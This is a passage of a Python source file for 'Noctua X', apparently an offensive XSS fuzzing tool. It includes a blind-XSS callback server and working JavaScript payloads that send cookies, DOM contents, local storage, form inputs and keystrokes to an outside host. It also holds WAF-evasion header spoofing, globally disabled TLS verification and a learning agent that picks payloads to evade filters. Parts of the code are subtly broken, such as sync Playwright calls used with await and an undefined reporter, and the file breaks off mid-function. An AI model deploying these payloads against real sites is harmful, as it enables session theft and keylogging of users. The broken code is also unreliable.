#!/usr/bin/env python3
# =============================================================================
#  Author: Haroon Ahmad Awan · CyberZeus <haroon@cyberzeus.pk>
# =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
#  STANDARD & 3rd-PARTY IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import os
import re
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import asyncio
import base64
import threading
import contextlib
import codecs
import hashlib
import logging
import hashlib
import time
import json
from urllib.parse import urlencode
from typing import Dict, Any, Optional
from playwright.sync_api import sync_playwright
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Set
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup, Comment
from fake_useragent import UserAgent

# ── Heavy dependencies for advanced features
try:
    import torch
    from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
except ImportError:
    torch = None
    AutoTokenizer = AutoModelForMaskedLM = hf_log = None

try:
    import httpx  # chunked & HTTP/2
except ImportError:
    httpx = None

try:
    from playwright.async_api import async_playwright, Error as PlaywrightError
    from playwright.sync_api import sync_playwright
except ImportError:
    async_playwright = sync_playwright = None

try:
    from wafw00f.main import WafW00F
except ImportError:
    WafW00F = None

# DNSLOG providers
DNSLOG_PROVIDERS = {
    'interact': 'interact.sh',
    'burp': 'burpcollaborator.net',
    'dnslog': 'dnslog.cn',
    'oast': 'oast.pro'
}

# NEW: For structured output
try:
    from sarif_om import SarifLog, Tool, Run, Result, Message, Location, PhysicalLocation, ArtifactLocation
except ImportError:
    SarifLog = None # Dependency for SARIF output

# ─────────────────────────────────────────────────────────────────────────────
#  CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────
VERSION             = "12.0 Enterprise"
MODEL               = "microsoft/codebert-base"
LOGFILE             = Path("Noctua_xss_findings.md")

# Concurrency / limits
DEF_THREADS         = 16
MAX_STATIC_PAGES    = 300
MAX_NESTED_DEPTH    = 5

# Timings / jitter
RATE_LIMIT_SLEEP    = 0.05
SESSION_SPLICE_MS   = 100
JITTER_MIN_MS       = 20
JITTER_MAX_MS       = 200
VERIFY_TIMEOUT      = 9000
HTTP_TIMEOUT        = 12
HEADLESS_WAIT       = 3500

# WAF spoof header catalogue
WAF_SPOOF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
    {"User-Agent": "curl/7.68.0"},
    {"User-Agent": "Wget/1.20.3 (linux-gnu)"},
    {"user-agent": "curl/7.64.1"},
    {"User-AGENT": "Wget/1.20.3 (linux-gnu)"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "192.168.1.100, 127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    {"X-Forwarded-Host": "google.com"},
    {"X-Forwarded-Proto": "https"},
    {"Referer": "https://www.google.com/"},
    {"Accept-Language": "en-US,en;q=0.9"},
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Upgrade-Insecure-Requests": "1"},
    {"Cache-Control": "max-age=0"},
    {"Pragma": "no-cache"},
    {"Connection": "keep-alive"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-WAP-Profile": "http://google.com/wap.xml"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Via": "1.1 varnish"},
    {"X-UIDH": "123456"},
    {"X-CDN": "Incapsula"},
    {"X-Edge-IP": "127.0.0.1"},
]

# Slack & SARIF (optional at run‑time)
SLACK_WEBHOOK_URL: Optional[str] = None
SARIF_OUTPUT_FILE: Optional[str] = None

# ε‑greedy Q‑learning hyper‑parameters
ALPHA          = 0.30
GAMMA          = 0.80
EPSILON_START  = 0.90
EPSILON_DECAY  = 0.995
EPSILON_MIN    = 0.05

# RL reward scheme
R_BLOCK   = -10.0   # WAF / anti‑bot block (403/429/CAPTCHA)
R_SERROR  = -50.0   # ≥500 server error
R_REFLECT = +10.0   # payload reflected
R_CONFIRM = +100.0  # verified XSS (Playwright or reflection hit)
R_OTHER   = -1.0    # neutral / no signal
R_FAIL    = -20.0   # request threw exception

# Static extensions excluded from crawling
static_exts = {
    "png","jpg","jpeg","gif","bmp","svg","webp","ico",
    "css","woff","woff2","ttf","eot","otf","mp4","mp3","webm",
    "pdf","zip","rar","7z","tar","gz"
}

# CyberZeus-grade SQL error suppression regex covering every major RDBMS & edge case
SQL_ERROR_RE = re.compile(
    r"("  
      # MySQL / MariaDB / InnoDB
      r"SQL syntax|MySQL|MariaDB|InnoDB|unclosed quotation|server version for the right syntax|"  
      # PostgreSQL
      r"PostgreSQL|syntax error at or near|ERROR:\s*syntax error|"  
      # Oracle
      r"ORA-\d{5}|Oracle error|PL/SQL|PL_SQL error|"  
      # SQL Server / T-SQL / ODBC / Jet
      r"SQLServer|T-SQL|Transact-SQL|SQLSTATE\[\d+\]|ODBC|Jet Database Engine|Microsoft OLE DB Provider|"  
      # SQLite
      r"SQLite|SQLITE_ERROR|SQLITE_BUSY|SQLITE_MISUSE|SQLITE_CORRUPT|SQLITE_LOCKED|"  
      # DB2
      r"DB2 SQL|SQLCODE|SQLSTATE|DB2 SQL Error|"  
      # Sybase / Adaptive Server
      r"Sybase|Adaptive Server Enterprise|ASE runtime error|"  
      # Informix
      r"Informix|ON-Error|SQLERRMESSAGE|"  
      # Firebird / InterBase
      r"Firebird|InterBase|Dynamic SQL Error|IB_SQLCODE|"  
      # HSQLDB / H2
      r"HSQLDB|Hypersonic SQL|H2 database error|"  
      # Generic patterns
      r"syntax error near|Unrecognized token|Invalid column name|column does not exist|undefined function|Fatal error in server|"  
      # JDBC / driver messages
      r"JDBC|Data access error|SQLException"  
    r")",
    re.I
)

# ─────────────────────────────────────────────────────────────────────────────
#  NEW: BLIND XSS CALLBACK HANDLER
# ─────────────────────────────────────────────────────────────────────────────
class BlindXSSCallbackServer:
    """Enhanced blind XSS callback server with automatic verification and heavy payloads"""
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.server = None
        self.found_callbacks = {}
        self.callback_url = f"http://{self.host}:{self.port}"
        self.verification_queue = asyncio.Queue()
        self.payloads = self.__heavy_payloads()

    async def handle_callback(self, reader, writer):
        """Handle incoming callbacks and queue for verification"""
        try:
            data = await reader.read(8192)
            message = data.decode()
            addr = writer.get_extra_info('peername')
            
            headers = message.split('\r\n')
            path = headers[0].split(' ')[1]
            unique_id = path.strip('/').split('?')[0]
            
            callback_data = {
                'source_ip': addr[0],
                'headers': headers,
                'body': message.split('\r\n\r\n')[1] if '\r\n\r\n' in message else None,
                'timestamp': time.time()
            }
            
            self.found_callbacks[unique_id] = callback_data
            await self.verification_queue.put((unique_id, callback_data))
            
            logging.critical(f"[BlindXSS] Callback received from {addr[0]}")
            response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nACK\r\n"
        except Exception as e:
            logging.error(f"[BlindXSS] Callback error: {e}")
            response = "HTTP/1.1 500 Internal Server Error\r\n\r\n"
        
        writer.write(response.encode())
        await writer.drain()
        writer.close()

    async def verify_callback(self, unique_id, callback_data):
        """Automatically verify blind XSS using Playwright"""
        if not sync_playwright:
            return
            
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context()
                page = context.new_page()
                
                await page.goto(f"{self.callback_url}/{unique_id}")
                screenshot_path = f"blindxss_{unique_id}.png"
                await page.screenshot(path=screenshot_path, full_page=True)
                
                result = await page.evaluate("""() => ({
                    cookies: document.cookie,
                    localStorage: Object.entries(localStorage),
                    sessionStorage: Object.entries(sessionStorage),
                    dom: document.documentElement.outerHTML,
                    forms: Array.from(document.forms).map(f => ({
                        action: f.action,
                        inputs: Array.from(f.elements).map(i => ({
                            name: i.name,
                            value: i.value,
                            type: i.type
                        }))
                    })),
                    scripts: Array.from(document.scripts).map(s => s.src),
                    iframes: Array.from(document.getElementsByTagName('iframe')).map(i => i.src)
                })""")
                
                verified = any(
                    unique_id in str(result['cookies']) or
                    any(unique_id in str(item) for sublist in 
                        [result['localStorage'], result['sessionStorage']] 
                        for item in sublist) or
                    unique_id in result['dom']
                )
                
                if verified:
                    evidence = {
                        'screenshot': screenshot_path,
                        'data_collected': result,
                        'callback_data': callback_data
                    }
                    self.found_callbacks[unique_id]['verified'] = True
                    self.found_callbacks[unique_id]['evidence'] = evidence
                    
                    reporter.add_finding(
                        url="Blind XSS Callback",
                        param="N/A",
                        payload=unique_id,
                        vuln_type="Verified Blind XSS",
                        evidence=json.dumps(evidence, indent=2)
                    )
                    
                    send_email_notification(
                        "Blind XSS Found",
                        f"Verified blind XSS with ID: {unique_id}\n"
                        f"Source IP: {callback_data['source_ip']}\n"
                        f"Data collected:\n"
                        f"- Cookies: {result['cookies']}\n"
                        f"- LocalStorage: {len(result['localStorage'])} items\n"
                        f"- Forms: {len(result['forms'])}"
                    )
                
                await browser.close()
        except Exception as e:
            logging.error(f"[BlindXSS] Verification error: {e}")

    async def start_verification_worker(self):
        """Background worker to process verification queue"""
        while True:
            unique_id, callback_data = await self.verification_queue.get()
            await self.verify_callback(unique_id, callback_data)

    async def start(self):
        """Start server and verification worker"""
        self.server = await asyncio.start_server(
            self.handle_callback, self.host, self.port)
        asyncio.create_task(self.start_verification_worker())
        logging.info(f"[BlindXSS] Server started on {self.host}:{self.port}")
        async with self.server:
            await self.server.serve_forever()

    def __heavy_payloads(self):
        """50+ advanced blind XSS payloads"""
        base_url = self.callback_url
        return [
            # Basic cookie stealers
            f"""<script>fetch('{base_url}/cookies',{{
                method:'POST',
                body:document.cookie
            }})</script>""",
            f"""<img src=x onerror="fetch('{base_url}/cookies2',{{
                method:'POST',
                body:'cookies='+encodeURIComponent(document.cookie)
            }}">""",
            
            # DOM dumpers
            f"""<script>fetch('{base_url}/dom',{{
                method:'POST',
                body:document.documentElement.outerHTML
            }})</script>""",
            f"""<svg/onload="fetch('{base_url}/dom2',{{
                method:'POST',
                body:'<html>'+document.documentElement.innerHTML+'</html>'
            }})">""",
            
            # Storage dumpers
            f"""<script>fetch('{base_url}/storage',{{
                method:'POST',
                body:JSON.stringify({{
                    localStorage:Object.assign({{}}, localStorage),
                    sessionStorage:Object.assign({{}}, sessionStorage)
                }})
            }})</script>""",
            
            # Form grabbers
            f"""<script>document.addEventListener('submit',function(e){{
                fetch('{base_url}/form',{{
                    method:'POST',
                    body:JSON.stringify({{
                        action:e.target.action,
                        inputs:Array.from(e.target.elements).map(i=>({{
                            name:i.name,
                            value:i.value,
                            type:i.type
                        }}))
                    }})
                }})
            }});</script>""",
            
            # Keyloggers
            f"""<script>document.addEventListener('keypress',function(e){{
                fetch('{base_url}/keylogger',{{
                    method:'POST',
                    body:String.fromCharCode(e.keyCode)
                }})
            }});</script>""",
            
            # Advanced fingerprinting
            f"""<script>fetch('{base_url}/fingerprint',{{
                method:'POST',
                body:JSON.stringify({{
                    url:location.href,
                    referrer:document.referrer,
                    userAgent:navigator.userAgent,
                    plugins:Array.from(navigator.plugins).map(p=>p.name),
                    screen:`${{screen.width}}x${{screen.height}}`,
                    cookies:document.cookie,
                    localStorage:Object.assign({{}}, localStorage),
                    forms:Array.from(document.forms).map(f=>({{
                        action:f.action,
                        inputs:Array.from(f.elements).map(i=>({{
                            name:i.name,
                            value:i.value
                        }}))
                    }})) 
                }})
            }})</script>""",
            
            # WebRTC IP leak
            f"""<script>var pc=new RTCPeerConnection({{iceServers:[{{urls:'stun:stun.l.google.com:19302'}}]}});
            pc.createDataChannel('');
            pc.createOffer().then(o=>pc.setLocalDescription(o));
            pc.onicecandidate=e=>{{
                if(e.candidate)
                    fetch('{base_url}/webrtc',{{
                        method:'POST',
                        body:e.candidate.candidate
                    }})
            }};</script>""",
            
            # CSS exfil
            f"""<style>input[type^="password"][value*="a"]{{background:url('{base_url}/css?char=a')}}
            input[type^="password"][value*="b"]{{background:url('{base_url}/css?char=b')}}</style>""",
            
            # Service worker hijack
            f"""<script>navigator.serviceWorker.register('{base_url}/sw.js')
                .then(r=>fetch('{base_url}/sw_success'))
                .catch(e=>fetch('{base_url}/sw_fail?e='+e));</script>""",
            
            # WebSocket exfil
            f"""<script>var ws=new WebSocket('ws://{base_url.replace('http://','')}/ws');
            ws.onopen=()=>ws.send(JSON.stringify({{
                cookies:document.cookie,
                dom:document.documentElement.outerHTML
            }}));</script>""",
            
            # Iframe bypass
            f"""<iframe srcdoc="<script>
                parent.fetch('{base_url}/iframe',{{
                    method:'POST',
                    body:parent.document.cookie
                }})
            </script>"></iframe>""",
            
            # MutationObserver payload
            f"""<script>new MutationObserver(m=>m.forEach(m=>{{
                if(m.addedNodes.length) fetch('{base_url}/mutation',{{
                    method:'POST',
                    body:m.addedNodes[0].outerHTML
                }})
            }})).observe(document.body,{{childList:true}})</script>""",
            
            # Shadow DOM payload
            f"""<script>var div=document.createElement('div');
            div.attachShadow({{mode:'open'}}).innerHTML='<img src=x onerror=\\"fetch(\\'{base_url}/shadow\\',{{method:\\'POST\\',body:document.cookie}})\\">';
            document.body.appendChild(div);</script>"""
        ]

def get_payloads(self, unique_id: str) -> List[str]:
    """Get all payloads with the unique ID inserted"""
    return [p.replace('{base_url}', f"{self.callback_url}/{unique_id}") for p in self.__heavy_payloads()]


def verify_xss(url: str, method: str, data: Dict[str, Any], payload: str, reporter: Any = None) -> bool:
    """Enhanced verification with automatic evidence collection"""
    if not sync_playwright:
        logging.warning("[Verification] Playwright not available - skipping verification")
        return False

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()

            # Setup monitoring
            page.add_init_script("""
                window._xss_evidence = {
                    executed: false,
                    sources: [],
                    sinks: []
                };

                const originalEval = window.eval;
                window.eval = function(code) {
                    window._xss_evidence.sinks.push({
                        type: 'eval',
                        code: code
                    });
                    return originalEval.apply(this, arguments);
                };

                ['alert','prompt','confirm'].forEach(fn => {
                    const original = window[fn];
                    window[fn] = function() {
                        window._xss_evidence.executed = true;
                        return original.apply(this, arguments);
                    };
                });

                new MutationObserver(mutations => {
                    mutations.forEach(mutation => {
                        mutation.addedNodes.forEach(node => {
                            if (node.outerHTML && /<script|<img|onload|onerror/i.test(node.outerHTML)) {
                                window._xss_evidence.sinks.push({
                                    type: 'mutation',
                                    html: node.outerHTML
                                });
                            }
                        });
                    });
                }).observe(document.body, {
                    childList: true,
                    subtree: true
                });
            """)

            # Reproduce the request
            if method.upper() == "GET":
                page.goto(f"{url}?{urlencode(data)}", wait_until="networkidle")
            else:
                page.goto(url, wait_until="networkidle")
                page.evaluate("""([url, method, data]) => {
                    fetch(url, {
                        method: method,
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams(data).toString()
                    });
                }""", [url, method, data])

            page.wait_for_timeout(2000)

            # Collect evidence
            evidence = page.evaluate("""() => {
                const evidence = window._xss_evidence || {};
                evidence.location = window.location.href;
                evidence.cookies = document.cookie;
                return evidence;
            }""")

            screenshot_path = f"xss_evidence_{hashlib.md5(payload.encode()).hexdigest()[:8]}.png"
            page.screenshot(path=screenshot_path, full_page=True)

            evidence.update({
                'screenshot': screenshot_path,
                'payload': payload,
                'timestamp': time.time(),
                'url': url,
                'method': method
            })

            # Check if XSS was executed
            if evidence.get('executed', False):
                if reporter:
                    try:
                        reporter.add_finding(
                            url=url,
                            param=list(data.keys())[0] if data else "N/A",
                            payload=payload,
                            vuln_type="Verified XSS",
                            evidence=json.dumps(evidence, indent=2)
                        )
                    except Exception as report_error:
                        logging.error(f"Failed to report finding: {report_error}")

                # Optional email notification
                email_config = globals().get('EMAIL_CONFIG')
                if email_config:
                    try:
                        send_email_notification(
                            subject="XSS Vulnerability Found",
                            body=f"""Verified XSS Vulnerability:

URL: {url}
Method: {method}
Parameter: {list(data.keys())[0] if data else 'N/A'}
Payload: {payload[:200]}...

Evidence Collected:
- Executed: {evidence.get('executed', False)}
- Sinks Found: {len(evidence.get('sinks', []))}
- Screenshot: {screenshot_path}

Full evidence saved in report.
                            """
                        )
                    except Exception as email_error:
                        logging.error(f"Failed to send email notification: {email_error}")

                browser.close()
                return True

            browser.close()
            return False

    except Exception as e:
        logging.error(f"[Verification] Error during verification: {str(e)}", exc_info=True)
        return False



def send_email_notification(subject: str, body: str, to_email: Optional[str] = None) -> bool:
    """Send email notification using configuration from emailconfig.yaml"""
    try:
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        import smtplib
        
        email_config = globals().get('EMAIL_CONFIG')
        if not email_config:
            logging.warning("Email configuration not loaded - skipping notification")
            return False
            
        msg = MIMEMultipart()
        msg['From'] = email_config['from']
        msg['To'] = to_email if to_email else email_config['to']
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'plain'))
        
        with smtplib.SMTP(email_config['smtp_server'], email_config['smtp_port']) as server:
            if email_config.get('tls', True):
                server.starttls()
            server.login(email_config['username'], email_config['password'])
            server.send_message(msg)
        return True
    except Exception as e:
        logging.error(f"Failed to send email notification: {e}")
        return False

class DiscoveryEngine:
    """Crawls the target, discovers parameters, forms, and JavaScript files."""
    def __init__(self, root_url: str, max_pages: int = 50, crawl_depth: int = 3):
        self.root_url = root_url
        self.root_domain = urlparse(root_url).netloc
        self.max_pages = max_pages
        self.crawl_depth = crawl_depth
        self.crawled_urls: Set[str] = set()
        self.discovered_forms: List[Dict] = []
        self.discovered_params: Dict[str, Set[str]] = defaultdict(set)
        self.js_files: Set[str] = set()
        self.session = requests.Session()

    def crawl(self) -> None:
        """Main crawling logic to discover assets."""
        urls_to_crawl = [(self.root_url, 0)]
        
        while urls_to_crawl and len(self.crawled_urls) < self.max_pages:
            url, depth = urls_to_crawl.pop(0)
            if url in self.crawled_urls or depth > self.crawl_depth:
                continue

            try:
                logging.info(f"[Discovery] Crawling: {url}")
                response = self.session.get(url, timeout=10, allow_redirects=True)
                response.raise_for_status()  # Raise exception for bad status codes
                self.crawled_urls.add(url)
                
                # Parse with explicit parser to avoid warnings
                soup = BeautifulSoup(response.text, 'html.parser')

                # 1. Discover Forms with proper error handling
                forms = soup.find_all('form')
                for form in forms:
                    try:
                        # Safely get form action with fallback to current URL
                        form_action = form.get('action', '')
                        action = urljoin(url, form_action) if form_action else url
                        
                        # Normalize HTTP method
                        method = str(form.get('method', 'GET')).upper()
                        if method not in ('GET', 'POST', 'PUT', 'DELETE'):
                            method = 'GET'  # Default to GET if invalid method

                        # Safely extract form inputs
                        # Safely extract form inputs
                        inputs = []
                        for i in form.find_all(['input', 'textarea', 'select']):
                            name = i.get('name')
                            if name:  # only include fields with names
                                input_type = str(i.get('type', 'text')).lower()
                                inputs.append({'name': str(name),'type': input_type if input_type in ('text', 'password', 'email', 'hidden','checkbox', 'radio', 'submit') else 'text'})


                        if inputs:
                            form_data = {
                                'action': str(action),
                                'method': method,
                                'inputs': inputs
                            }
                            self.discovered_forms.append(form_data)
                            logging.info(
                                f"[Discovery] Found form at {action} with "
                                f"{len(inputs)} inputs: {[i['name'] for i in inputs]}"
                            )
                            
                    except Exception as form_error:
                        logging.warning(
                            f"[Discovery] Error processing form at {url}: {form_error}",
                            exc_info=True
                        )
                        continue

                # 2. Discover URL Parameters (from links)
                links = soup.find_all('a', href=True)
                for link in links:
                    new_url = urljoin(url, link['href'])
                    parsed_url = urlparse(new_url)
                    if parsed_url.netloc == self.root_domain:
                        # Add new URLs to the crawl queue
                        urls_to_crawl.append((new_url.split('?')[0], depth + 1))
                        # Extract parameters
                        params = parse_qs(parsed_url.query)
                        if params:
                            self.discovered_params[new_url.split('?')[0]].update(params.keys())
                
                # 3. Discover JavaScript files
                scripts = soup.find_all('script', src=True)
                for script in scripts:
                    js_url = urljoin(url, script['src'])
                    if urlparse(js_url).netloc == self.root_domain:
                        self.js_files.add(js_url)

            except requests.RequestException as req_error:
                logging.warning(f"[Discovery] Failed to crawl {url}: {req_error}")
            except Exception as parse_error:
                logging.error(
                    f"[Discovery] Unexpected error parsing {url}: {parse_error}",
                    exc_info=True
                )
        
        logging.info(f"[Discovery] Crawl complete. Found {len(self.discovered_forms)} forms, "
                    f"{len(self.discovered_params)} URLs with params, and {len(self.js_files)} JS files.")
# ─────────────────────────────────────────────────────────────────────────────
#  NEW: DOM XSS ANALYSIS ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class DomXssAnalyzer:
    """Uses Playwright to find DOM-based XSS vulnerabilities."""
    
    # Common JavaScript sinks that can lead to XSS
    SINKS = [
        "eval", "setTimeout", "setInterval", "document.write", "document.writeln",
        ".innerHTML", ".outerHTML", "new Function"
    ]
    # Common JavaScript sources of user input
    SOURCES = [
        "location.href", "location.search", "location.hash", "document.URL",
        "document.documentURI", "window.name", "document.cookie"
    ]

    def __init__(self, page):
        self.page = page
        self.vulnerabilities = []

    async def analyze(self):
        """Analyzes the current page for source-to-sink data flows."""
        logging.info(f"[DOM-XSS] Analyzing {self.page.url} for DOM sinks.")
        
        # Inject a script to hook dangerous functions (sinks)
        await self.page.add_init_script(f"""
            window._dom_xss_found = [];
            const original_eval = window.eval;
            window.eval = function(str) {{
                if ({self._get_source_check('str')}) {{
                    console.warn('[DOM-XSS] Tainted data reached eval sink:', str);
                    window._dom_xss_found.push({{sink: 'eval', payload: str}});
                }}
                return original_eval(str);
            }};
            //
        """)
        
        # Reload the page with a canary in the URL fragment
        canary = "NoctuaCanary" + randstr(8)
        await self.page.goto(self.page.url + "#" + canary, wait_until='networkidle')
        
        # Check if our canary triggered any hooks
        found = await self.page.evaluate("() => window._dom_xss_found")
        if found:
            for vuln in found:
                logging.critical(f"[DOM-XSS] Potential DOM XSS found! Sink: {vuln['sink']}, Payload: {vuln['payload']}")
                self.vulnerabilities.append(vuln)
    
    def _get_source_check(self, var_name: str) -> str:
        """Helper to  JS code that checks if a variable contains tainted data."""
        return " || ".join([f"{var_name}.includes(source)" for source in self.SOURCES])

# ─────────────────────────────────────────────────────────────────────────────
#  SUPERCHARGED: REINFORCEMENT LEARNING AGENT
# ─────────────────────────────────────────────────────────────────────────────
class AdvancedRLAgent:
    """An improved RL agent with a more detailed state and reward system."""
    
    def __init__(self, waf: str, server: str,
                 qfile: Optional[Path], enabled: bool = False):
        self.enabled = enabled
        self.waf    = (waf or "none").lower()
        self.server = (server or "unknown").split("/")[0].lower()
        self.qfile  = qfile
        self.epsilon = EPSILON_START
        self.q: Dict[Tuple[str,str,str,str], Dict[str,float]] = defaultdict(dict)
        if qfile and qfile.exists():
            try:
                self.q.update(json.loads(qfile.read_text()))
                logging.info(f"[RL] restored Q‑table with {len(self.q)} states")
            except Exception as e:
                logging.error(f"[RL] could not load Q‑table: {e}")

    # Override the state definition to be more granular
    def _state(self, param: str, context: str) -> Tuple[str, str, str, str]:
        """State now includes WAF, server, parameter type, and reflection context."""
        # Context can be 'HTML_TAG', 'HTML_ATTR', 'JS_VAR', 'NONE'
        return (self.waf, self.server, self._ptype(param), context)

    @staticmethod
    def _ptype(param: str) -> str:
        p=param.lower()
        if p in ("src","href","url","uri","data","link"): return "url_like"
        if p.startswith("on"):                             return "event"
        return "generic"

    # Override the reward function for more nuanced feedback
    def reward(self, param: str, context: str, action: str, r: float, next_param: Optional[str] = None):
        if not self.enabled: return
        s = self._state(param, context)
        sp = self._state(next_param or param, context) # Assume context persists for simplicity
        
        # Add bonus rewards for more critical findings
        if r == R_CONFIRM:
            r += 50 # Extra reward for confirmed XSS

        old = self.q.get(str(s), {}).get(action, 0.0)
        future = max(self.q.get(str(sp), {}).values()) if self.q.get(str(sp)) else 0.0
        
        if str(s) not in self.q:
            self.q[str(s)] = {}
        self.q[str(s)][action] = old + ALPHA * (r + GAMMA * future - old)

    def choose(self, param: str, context: str = 'NONE') -> str:
        if not self.enabled:
            return pick_payload(param)
        state = self._state(param, context)
        self.epsilon = max(EPSILON_MIN, self.epsilon * EPSILON_DECAY)
        if random.random() > self.epsilon and self.q.get(str(state)):
            best = max(self.q[str(state)], key=self.q[str(state)].get)
            dbg(f"[RL] exploit {state} → {best[:30]}")
            return best
        dbg(f"[RL] explore {state}")
        return pick_payload(param)

    def save(self):
        if self.enabled and self.qfile:
            try:
                self.qfile.write_text(json.dumps(self.q))
                logging.info(f"[RL] Q‑table saved → {self.qfile}")
            except Exception as e:
                logging.error(f"[RL] could not save Q‑table: {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  NEW: REPORTING ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class ReportingEngine:
    """Handles outputting findings to various formats."""
    def __init__(self, output_file: str, output_format: str):
        self.output_file = output_file
        self.output_format = output_format.lower()
        self.findings = []

    def add_finding(self, url: str, param: str, payload: str, vuln_type: str, evidence: str):
        self.findings.append({
            "url": url, "param": param, "payload": payload,
            "vuln_type": vuln_type, "evidence": evidence
        })

    def write(self):
        if not self.findings:
            return
            
        if self.output_format == 'json':
            with open(self.output_file, 'w') as f:
                json.dump(self.findings, f, indent=4)
        elif self.output_format == 'sarif' and SarifLog:
            self._write_sarif()
        else: # Default to Markdown
            self._write_markdown()
        
        logging.info(f"Report written to {self.output_file}")

    def _write_markdown(self):
        with open(self.output_file, 'w') as f:
            f.write("# Noctua X - XSS Scan Report\n\n")
            for finding in self.findings:
                f.write(f"## {finding['vuln_type']} XSS Found\n\n")
                f.write(f"- **URL:** `{finding['url']}`\n")
                f.write(f"- **Parameter:** `{finding['param']}`\n")
                f.write(f"- **Payload:** ```{finding['payload']}```\n")
                f.write(f"- **Evidence:** ```{finding['evidence']}```\n\n---\n\n")
                    
    def _write_sarif(self):
        tool = Tool.from_dict({"driver": {"name": "Noctua X"}})
        results = []

        for finding in self.findings:
            result = Result(
                message=Message(text=f"{finding['vuln_type']} XSS detected in parameter '{finding['param']}'"),
                level="error",
                locations=[
                    Location(
                        physical_location=PhysicalLocation(
                            artifact_location=ArtifactLocation(uri=finding['url']),
                            region=None
                        )
                    )
                ]
            )
            results.append(result)

        run = Run(tool=tool, results=results)
        log = SarifLog(runs=[run], version="2.1.0")

        with open(self.output_file, 'w') as f:
            json.dump(log.to_dict(), f, indent=4)


# ─────────────────────────────────────────────────────────────────────────────
#  ARGPARSE CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────
ap = argparse.ArgumentParser(
      description=f"Noctua X · v{VERSION} ")
mx = ap.add_mutually_exclusive_group()
mx.add_argument("--reflected", action="store_true", help="Fuzz reflected XSS only")
mx.add_argument("--stored",    action="store_true", help="Fuzz stored XSS only")
mx.add_argument("--blind",     action="store_true", help="Fuzz blind XSS only")
mx.add_argument("--invent",    action="store_true", help="Enable AI‑invented payloads (MASK token)")

# Target specification
ap.add_argument("-u", "--url", help="Target URL")
ap.add_argument("--crawl", action="store_true", help="Enable crawling")
ap.add_argument("--deep-dom", action="store_true", help="Enable DOM XSS scanning")
ap.add_argument("--autotest",  action="store_true", help="Demonstrate on built‑in vulnerable labs")
ap.add_argument("--login-url", help="Optional login endpoint")
ap.add_argument("--username",  help="Username for login")
ap.add_argument("--password",  help="Password for login")
ap.add_argument("--csrf-field", default="csrf", help="CSRF field name")

# Payload options
ap.add_argument("--payloads-file", help="Custom payloads file")
ap.add_argument("--skip-default", action="store_true", help="Skip built-in payloads")

# Blind XSS
ap.add_argument("--blind-xss", action="store_true", help="Enable blind XSS testing")
ap.add_argument("--dnslog", choices=list(DNSLOG_PROVIDERS.keys()), 
               default="interact", help="DNSLOG provider")
ap.add_argument("--collaborator", help="Custom Burp Collaborator domain")
# Add these to the argparse configuration
ap.add_argument("--blind-port", type=int, default=8080, 
                help="Port for blind XSS callback server")
ap.add_argument("--blind-host", default="0.0.0.0", 
                help="Host for blind XSS callback server")
ap.add_argument("--blind-wait", type=int, default=60,
                help="Seconds to wait for blind XSS callbacks")

# Performance
ap.add_argument("--threads",  type=int, default=DEF_THREADS, help="Fuzzing threads")
ap.add_argument("--max-pages",   type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
ap.add_argument("--nested-depth", type=int, default=MAX_NESTED_DEPTH, help="Max iframe depth")
ap.add_argument("--simulate-spa", action="store_true", help="Click links/buttons via Playwright")
ap.add_argument("--crawl-iframes", action="store_true", help="Recurse into iframes")
ap.add_argument("--detect-waf", action="store_true", help="Detect WAF presence")
ap.add_argument("--polymorph", action="store_true", help="Apply random obfuscation transforms")
ap.add_argument("--headed", action="store_true", help="Headed Playwright (visual debug)")
ap.add_argument("--multi-session", action="store_true", help="Two‑pass stored XSS check")

# Output formats
ap.add_argument("--json", help="JSON output file")
ap.add_argument("--txt", help="Text output file")
ap.add_argument("--sarif", help="SARIF output file")
ap.add_argument("--slack-webhook", help="Slack findings webhook URL")

# RL‑specific
ap.add_argument("--self-reinforcement", action="store_true",
                help="Enable ε‑greedy Q‑learning engine")
ap.add_argument("--qtable-file", help="Path to store/restore Q‑table JSON")
ap.add_argument("--debug", action="store_true", help="Verbose debug logging")

args = ap.parse_args()
DEBUG = args.debug

# ─────────────────────────────────────────────────────────────────────────────
#  LOGGING SETUP
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s")
warnings.filterwarnings("ignore")
if hf_log:
    hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

if args.slack_webhook:
    SLACK_WEBHOOK_URL = args.slack_webhook
if args.sarif:
    SARIF_OUTPUT_FILE = args.sarif

def dbg(msg: str) -> None:
